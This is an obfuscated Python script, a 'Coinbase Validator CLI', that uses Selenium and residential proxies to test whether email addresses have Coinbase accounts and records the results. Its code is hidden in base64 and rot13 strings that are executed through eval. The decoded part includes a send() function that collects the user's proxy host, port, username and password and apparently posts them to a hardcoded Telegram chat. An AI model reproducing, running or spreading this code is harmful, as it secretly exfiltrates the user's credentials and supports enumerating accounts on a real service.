import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzICxzeXMgLG9zICx6aXBmaWxlICx0aW1lICNsaW5lOjENCmZyb20gY29uY3VycmVudCAuZnV0dXJlcyBpbXBvcnQgUHJvY2Vzc1Bvb2xFeGVjdXRvciAjbGluZToyDQpmcm9tIGNvbmN1cnJlbnQgLmZ1dHVyZXMgaW1wb3J0IGFzX2NvbXBsZXRlZCAjbGluZTozDQpmcm9tIHB5dmlydHVhbGRpc3BsYXkgaW1wb3J0IERpc3BsYXkgI2xpbmU6NA0KZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSAjbGluZTo1DQpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0ICNsaW5lOjYNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwICNsaW5lOjcNCmZyb20gc2VsZW5pdW0gaW1wb3J0IHdlYmRyaXZlciAjbGluZToxMA0KZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5jb21tb24gLmJ5IGltcG9ydCBCeSAjbGluZToxMQ0KZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5jb21tb24gLmtleXMgaW1wb3J0IEtleXMgI2xpbmU6MTINCmZyb20gc2VsZW5pdW0gLndlYmRyaXZlciAuY29tbW9uIC5hY3Rpb25fY2hhaW5zIGltcG9ydCBBY3Rpb25DaGFpbnMgI2xpbmU6MTMNCmZyb20gc2VsZW5pdW0gLndlYmRyaXZlciAuc3VwcG9ydCAud2FpdCBpbXBvcnQgV2ViRHJpdmVyV2FpdCAjbGluZToxNA0KZnJvbSBzZWxlbml1bSAud2ViZHJpdmVyIC5zdXBwb3J0IGltcG9ydCBleHBlY3RlZF9jb25kaXRpb25zIGFzIEVDICNsaW5lOjE1DQpmcm9tIHNlbGVuaXVtIC53ZWJkcml2ZXIgLmNocm9tZSAub3B0aW9ucyBpbXBvcnQgT3B0aW9ucyAjbGluZToxNg0KZnJvbSBzZWxlbml1bSAuY29tbW9uIC5leGNlcHRpb25zIGltcG9ydCBUaW1lb3V0RXhjZXB0aW9uICNsaW5lOjE3DQpmcm9tIGRvdGVudiBpbXBvcnQgbG9hZF9kb3RlbnYgI2xpbmU6MTgNCmltcG9ydCBjaHJvbWVkcml2ZXJfYmluYXJ5ICNsaW5lOjE5DQppbml0IChhdXRvcmVzZXQgPVRydWUgKSNsaW5lOjIxDQpkaXNwbGF5ID1EaXNwbGF5ICh2aXNpYmxlID0wICxzaXplID0oODAwICw4MDAgKSkjbGluZToyMg0KZGlzcGxheSAuc3RhcnQgKCkjbGluZToyMw0KdHJ5IDojbGluZToyNg0KICBvcyAubWtkaXIgKCdyZXN1bHQnKSNsaW5lOjI3DQpleGNlcHQgOiNsaW5lOjI4DQogIHBhc3MgI2xpbmU6MjkNCmNiID1mJycnICAgICAgDQp7Rm9yZS5MSUdIVEdSRUVOX0VYfSAgICAgICAgICkgKCAgICAgICApICAgICAgICAgICAgICAoICAgICAgICANCntGb3JlLkxJR0hUR1JFRU5fRVh9ICAgKCAgKCAvKCApXCApICggLyggICAoICAgICggICAgIClcICkgICAgIA0Ke0ZvcmUuTElHSFRHUkVFTl9FWH0gICApXCApXCgpfCgpLyggKVwoKSkoIClcICAgKVwgICAoKCkvKCggICAgDQp7Rm9yZS5MSUdIVEdSRUVOX0VYfSAoKChffChfKVwgLyhfKXwoXylcICkoKF98KCgoXykoICAvKF8pKVwgICANCntGb3JlLkxJR0hUR1JFRU5fRVh9IClcX19fICgoX3xfKSkgIF8oKF98KF8pXyApXCBfIClcKF8pKSgoXykgIA0Ke0ZvcmUuTElHSFRHUkVFTl9FWH0oKC8gX18vIF8gXF8gX3x8IFx8IHx8IF8gKShfKV9cKF8pIF9ffCBfX3wgDQp7Rm9yZS5MSUdIVEdSRUVOX0VYfSB8IChffCAoXykgfCB8IHwgLmAgfHwgXyBcIC8gXyBcIFxfXyBcIF98ICANCntGb3JlLkxJR0hUR1JFRU5fRVh9ICBcX19fXF9fXy9fX198fF98XF98fF9fXy8vXy8gXF9cfF9fXy9fX198IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0Ke0ZvcmUuTElHSFRDWUFOX0VYfSAgICAgICAgICAgICAgICBWQUxJREFUT1IgQ0xJICAgIA0KJycnI2xpbmU6NDMNCnByaW50IChmJ3tjYn17Rm9yZS5SRVNFVH09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG5cbicpI2xpbmU6NDYNCmRlZiBwcm94eSAoKTojbGluZTo1MA0KICBsb2FkX2RvdGVudiAoKSNsaW5lOjUxDQogIE8wTzBPTzBPMDBPME9PMDAwID1vcyAuZ2V0ZW52ICgndXNlcm5hbWUnKSNsaW5lOjUyDQogIE8wMDBPT08wT08wTzBPT09PID1vcyAuZ2V0ZW52ICgncGFzc3dvcmQnKSNsaW5lOjUzDQogIE8wME9PMDBPTzBPMDAwME9PID1vcyAuZ2V0ZW52ICgnaG9zdCcpI2xpbmU6NTQNCiAgT08wME9PTzBPME8wME8wMDAgPW9zIC5nZXRlbnYgKCdwb3J0JykjbGluZTo1NQ0KICBPT09PT08wT08wTzAwTzBPMCA9b3MgLmdldGVudiAoJ2lwX3BvcnQnKSNsaW5lOjU2DQogIE8wTzBPTzAwME9PT09PMDAwID1vcyAuZ2V0ZW52ICgndGlwZScpI2xpbmU6NTcNCiAgdHJ5IDojbGluZTo1OA0KICAgIGlmICdyZXNpZGVudGlhbCdpbiBPME8wT08wMDBPT09PTzAwMCA6I2xpbmU6NTkNCiAgICAgIGltcG9ydCBzZWxlbml1bXdpcmUgLnVuZGV0ZWN0ZWRfY2hyb21lZHJpdmVyIC52MiBhcyB1YyAjbGluZTo2MA0KICAgICAgTzAwTzBPTzAwTzAwMDAwT08gPXsndmVyaWZ5X3NzbCc6VHJ1ZSAsJ3Byb3h5Jzp7J2h0dHAnOmYnaHR0cDovL3tPME8wT08wTzAwTzBPTzAwMH06e08wMDBPT08wT08wTzBPT09PfUB7'
love = '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'
god = 'dF90ZXh0ICgpI2xpbmU6MTEwDQogICAgICAgIGlmICJObyBDb2luYmFzZSBhY2NvdW50IGV4aXN0cyBmb3IgdGhpcyBlbWFpbC4gUGxlYXNlIGNoZWNrIHlvdXIgc3BlbGxpbmcgb3IgY3JlYXRlIGFuIGFjY291bnQuImluIE9PME9PMDAwME8wMDBPMDBPIDojbGluZToxMTENCiAgICAgICAgICBwcmludCAoZid7Rm9yZS5MSUdIVFdISVRFX0VYfVsjXXtGb3JlLkxJR0hUR1JFRU5fRVh9IHtPMDBPT09PME9PT09PT08wT30ge0ZvcmUuTElHSFRXSElURV9FWH09e0ZvcmUuTElHSFRSRURfRVh9ICBEaWV7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykjbGluZToxMTINCiAgICAgICAgICBPT08wTzAwTzAwT08wT09PTyA9b3BlbiAoJ3Jlc3VsdC9kaWUudHh0JywnYSsnKSNsaW5lOjExMw0KICAgICAgICAgIE9PTzBPMDBPMDBPTzBPT09PIC53cml0ZSAoJ1xuJykjbGluZToxMTQNCiAgICAgICAgICBPT08wTzAwTzAwT08wT09PTyAud3JpdGVsaW5lcyAoTzAwT09PTzBPT09PT09PME8gKSNsaW5lOjExNQ0KICAgICAgICAgIE9PTzBPMDBPMDBPTzBPT09PIC5jbG9zZSAoKSNsaW5lOjExNg0KICAgICAgICAgIE9PTzAwME8wMDBPME8wME9PIC5xdWl0ICgpI2xpbmU6MTE3DQogICAgICBleGNlcHQgOiNsaW5lOjExOA0KICAgICAgICBwcmludCAoZid7Rm9yZS5MSUdIVFdISVRFX0VYfVsjXXtGb3JlLkxJR0hUR1JFRU5fRVh9IHtPMDBPT09PME9PT09PT08wT30ge0ZvcmUuTElHSFRXSElURV9FWH09e0ZvcmUuTElHSFRZRUxMT1dfRVh9IENhcHRjaGF7Rm9yZS5MSUdIVFdISVRFX0VYfSB+IENCe0ZvcmUuTElHSFRCTFVFX0VYfSBieSBRcmlzX0dob3N0JykjbGluZToxMTkNCiAgICAgICAgT09PME8wME8wME9PME9PT08gPW9wZW4gKCdyZXN1bHQvcHJveHkudHh0JywnYSsnKSNsaW5lOjEyMA0KICAgICAgICBPT08wTzAwTzAwT08wT09PTyAud3JpdGUgKCdcbicpI2xpbmU6MTIxDQogICAgICAgIE9PTzBPMDBPMDBPTzBPT09PIC53cml0ZWxpbmVzIChPMDBPT09PME9PT09PT08wTyApI2xpbmU6MTIyDQogICAgICAgIE9PTzBPMDBPMDBPTzBPT09PIC5jbG9zZSAoKSNsaW5lOjEyMw0KICAgICAgICBPT08wMDBPMDAwTzBPMDBPTyAucXVpdCAoKSNsaW5lOjEyNA0KICBleGNlcHQgOiNsaW5lOjEyNQ0KICAgIHByaW50IChmJ3tGb3JlLkxJR0hUV0hJVEVfRVh9WyNde0ZvcmUuTElHSFRHUkVFTl9FWH0ge08wME9PT08wT09PT09PTzBPfSB7Rm9yZS5MSUdIVFdISVRFX0VYfT17Rm9yZS5MSUdIVFlFTExPV19FWH0gQmFkIFByb3h5e0ZvcmUuTElHSFRXSElURV9FWH0gfiBDQntGb3JlLkxJR0hUQkxVRV9FWH0gYnkgUXJpc19HaG9zdCcpI2xpbmU6MTI2DQogICAgT09PME8wME8wME9PME9PT08gPW9wZW4gKCdyZXN1bHQvcHJveHkudHh0JywnYSsnKSNsaW5lOjEyNw0KICAgIE9PTzBPMDBPMDBPTzBPT09PIC53cml0ZSAoJ1xuJykjbGluZToxMjgNCiAgICBPT08wTzAwTzAwT08wT09PTyAud3JpdGVsaW5lcyAoTzAwT09PTzBPT09PT09PME8gKSNsaW5lOjEyOQ0KICAgIE9PTzBPMDBPMDBPTzBPT09PIC5jbG9zZSAoKSNsaW5lOjEzMA0KICAgIE9PTzAwME8wMDBPME8wME9PIC5xdWl0ICgpI2xpbmU6MTMxDQpkZWYgc2VuZCAoTzAwME8wMDBPMDBPMDAwTzAgKTojbGluZToxMzQNCiAgbG9hZF9kb3RlbnYgKCkjbGluZToxMzUNCiAgTzAwT09PTzAwMDAwME9PT08gPW9zIC5nZXRlbnYgKCd1c2VybmFtZScpI2xpbmU6MTM2DQogIE8wTzAwME9PT08wME9PT09PID1vcyAuZ2V0ZW52ICgncGFzc3dvcmQnKSNsaW5lOjEzNw0KICBPT08wTzAwT09PT09PT09PMCA9b3MgLmdldGVudiAoJ2hvc3QnKSNsaW5lOjEzOA0KICBPT09PT08wME8wTzAwT08wMCA9b3MgLmdldGVudiAoJ3BvcnQnKSNsaW5lOjEzOQ0KICBPMDBPMDBPT08wT08wME8wMCA9b3MgLmdldGVudiAoJ2lwX3BvcnQnKSNsaW5lOjE0MA0KICBPME8wMDAwME8wME9PT09PMCA9ZicnJw0KICA8cD5BcGkgQ29kZSA9IHtPMDAwTzAwME8wME8wMDBPMH08L3A+DQogIA0KICA8cHJlPlZhbGlkYXRvciBDb2luYmFzZTwvcHJlPg0KICAnJycjbGluZToxNDUNCiAgTzAwT09PME9PTzAwTzBPT08gPWYnJycNCiAgPHA+QXBpIENvZGUgPSB7TzAwME8wMDBPMDBPMDAwTzB9PC9wPg0KICANCiAgPGNlbnRlcj5Qcm94eSBJcCBQb3J0PC9wPg0KICA8cD5TZXJ2ZXIgPSB7TzAwTzAwT09PME9PMDBPMDB9PC9wPg0KDQogIDxjZW50ZXI+UHJveHkgUmVzaWRuZXRpYWw8L2NlbnRlcj4NCiAgPHA+SG9zdCA9IHtPT08wTzAwT09PT09PT09PMH08L3A+DQogIDxwPlBvcnQgPSB7T09PT09PMDBPME8wME9PMDB9PC9wPg0KICA8cD5Vc2VybmFtZSA9IHtPMDBPT09PMDAwMDAwT09PT308L3A+DQogIDxwPlBhc3N3b3JkID0ge08wTzAwME9PT08wME9PT09PfTwvcD4NCg0KDQogIDxwcmU+VmFsaWRhdG9yIENvaW5iYXNlPC9wcmU+DQogICcnJyNs'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
